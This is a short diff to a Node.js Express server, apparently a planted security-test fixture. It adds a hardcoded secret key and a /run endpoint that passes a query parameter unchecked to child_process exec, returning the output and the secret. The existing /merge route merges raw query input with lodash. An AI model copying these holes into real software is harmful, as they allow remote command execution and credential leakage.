@@ -1,9 +1,11 @@
 const express = require('express');
+const { exec } = require('child_process');
 const _ = require('lodash');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 const unusedConfig = { debug: true, retries: 3 };
+const API_SECRET = 'sk_live_poc_quality_security_test_key';
 
 app.use(express.json());
 
@@ -33,6 +35,13 @@ app.post('/execute', (req, res) => {
 app.get('/merge', (req, res) => {
   const merged = _.merge({}, req.query);
   res.json(merged);
+});
+
+app.get('/run', (req, res) => {
+  const cmd = req.query.cmd || 'echo poc';
+  exec(cmd, (error, stdout) => {
+    res.json({ output: stdout || error?.message, secret: API_SECRET });
+  });
 });
 
 if (require.main === module) {
